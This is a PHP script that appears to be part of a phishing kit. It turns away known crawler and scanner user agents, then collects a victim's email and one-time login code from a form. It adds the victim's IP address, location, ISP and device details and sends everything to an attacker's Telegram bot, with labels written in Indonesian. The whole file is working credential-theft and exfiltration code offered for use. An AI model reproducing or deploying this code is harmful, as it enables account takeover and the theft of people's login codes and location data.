<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) {
header('Location: oops.php');
die();
}

include '../setting.php';
include '../geolocation.php';

function sendMessage($idTelegram, $messageBot, $tokenBot) {

    $url = "https://api.telegram.org/bot" . $tokenBot . "/sendMessage?parse_mode=html&chat_id=" . $idTelegram;
    $url = $url . "&text=" . urlencode($messageBot);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}

$email = $_POST['imelkadua'];
$logincode = $_POST['logincode'];

if($email == "" && $logincode == "") {
header("Location: index.php");
} else {

$messageBot = "
<b>AKUN $email</b>

<b>[INI KODENYA]</b>
Kode Login : <code>$logincode</code>

<b>[INFORMASI]</b>
IP: <code>$ip_address</code>
Kode Telp: <code>$callingcode</code>
Negara: <code>[$flag $countrycode] $country</code>
Provinsi: <code>$province</code>
Kota: <code>$city</code>
ISP: <code>$isp</code>

<b>[UA]</b>
Perangkat: <code>$ua</code>
";
}

sendMessage($idTelegram, $messageBot, $tokenBot);
?>